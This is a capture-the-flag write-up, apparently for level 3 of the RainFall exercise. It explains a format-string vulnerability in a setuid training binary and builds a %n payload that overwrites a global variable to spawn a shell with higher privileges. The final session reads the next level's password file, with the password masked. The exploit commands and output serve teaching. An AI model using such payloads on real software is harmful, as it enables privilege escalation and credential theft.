# LEVEL3

## 1. Inspect The Executable

```bash
level3@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level4 users 5366 Mar  6  2016 level3
```

We can see that the binary has the `s` bit set on the **execution permission**, which means the program will run with level4 privileges.

```
level3@RainFall:~$ ./level3 
    

level3@RainFall:~$ ./level3 
a
a
level3@RainFall:~$ ./level3 
abc
abc
level3@RainFall:~$ ./level3 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

The program waits for **user input**, most likely a call to `read` or a `gets` and prints it back. But there is no segfault error.

## 2. Analyze The Executable

```bash
(gdb) info functions 
All defined functions:

Non-debugging symbols:
[...]
0x080484a4  v
0x0804851a  main
[...]
```

Using the gdb command `info functions`, we can list all functions present in the binary.
Here, we find 2 interesting functions: `main` and `v`.

### Program Behavior

#### main function


The `main` function calls `v()` then returns.

#### v function 

The `v` function first calls `fgets()` on `stdout` to store the input in a **local variable** `level_20c` with a **size limit** of `0x200` (512 in decimal).

Then it checks if an unknown variable (probably global) `m` is equal to `0x40` (64 in decimal). If the condition is `true`, the program prints `Wait what?!\n` and call `system("/bin/sh")`.

The function then returns.

## 3. Exploit Development

In this level, we cannot perform a classic stack buffer overflow via user input.
The call to `fgets()` **limits the input size**, which **prevents overflowing** the stack buffer.

Instead, the **vulnerability** comes from `printf()`.

### Discover `printf` Exploit

The **vulnerability** exists in the following line:
```c
  printf(local_20c);
```

Here, user-controlled input is passed **directly** as the **format string**.
Instead of using a **safe call** such as `printf("%s", local_20c)`, the program allows us to **inject format specifiers**.

For example, `%x` reads and prints values from the stack as hexadecimal, consuming one stack argument per specifier.
This behavior allows us to read and write arbitrary values in memory.

This attack is known as a **Format String Attack**.

---

### Exploit Principle

The goal is to modify the global variable `m` so that its value becomes `0x40`, which triggers the call to `system("/bin/sh")`.

Here is the following attack structure:
```
<memory address to update>	<padding>	<%X$n>
```

Where:
  - `<memory address to update>` is the **address** of the **target variable** (`m`).
  - `<padding>` represents the **number of characters** to print.
  - `<%X$n>` **writes** the number of printed characters to the **memory address** located at position `X` on the **stack**.

The total **number of printed characters** (i.e, `<memory address to update>` + `<padding>`) determines the **value written** to the target address.

`%X$n` is a **positional format specifier** that allows writing to memory.

Structure:
- `%`  : begins the **format directive**.
- `X$` : indicates which **stack argument** (represented by `X`) is used as the **destination address**.
- `n`  : **writes** the number of characters printed so far **into that address**.

---

### Get Exploit Values

First, we use `%x` to **find the position** of our **input** on the **stack**:

```bash
level3@RainFall:~$ python -c "print 'aaaa' + '%x %x %x %x %x %x' " | ./level3 
aaaa200 b7fd1ac0 b7ff37d0 61616161 25207825 78252078
```

`aaaa` corresponding to `61616161` in hexadecimal appears at the **4th position** on the stack.
This position will be used in the last part of the format string: `<%X$n>`.

---

Next, we need the address of the **target variable**.

From the assembly dump, we can find the `if` statement:

```s
   0x080484da <+54>:	mov    0x804988c,%eax
   0x080484df <+59>:	cmp    $0x40,%eax
```

The **target address** is therefore : `0x804988c`. In little-endian format:
```
\x8c\x98\x04\x08
```

---

Finally, we need to implement the **value to write**. Here, the target value is `0x40` (64 in decimal), structured as follows:

```
<memory address to update>  +   <padding>	
              4             +       60      = 64
```

The padding ensures that exactly **64 characters** are printed before the `%n` **writes** this value **into the target address**.

---

### Create the Payload

```
python -c "print '\x8c\x98\x04\x08' + 'a' * 60  + '%4\$n' " > /tmp/p3
```

Note:
- The backslash (`\`) in the last element is used to escape the `$` character.


**Explanation:**
- `python`			: launches the Python interpreter.
- `-c` 					: executes the command passed as a string.
- `print` 			: outputs data to standard output.



## 4. Capture The Flag

```bash
level3@RainFall:~$ python -c "print '\x8c\x98\x04\x08' + 'a' * 60  + '%4\$n' " > /tmp/p3
level3@RainFall:~$ cat /tmp/p3 - | ./level3 
�aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Wait what?!
id
uid=2022(level3) gid=2022(level3) euid=2025(level4) egid=100(users) groups=2025(level4),100(users),2022(level3)
cat /home/user/level4/.pass            
XXX
```
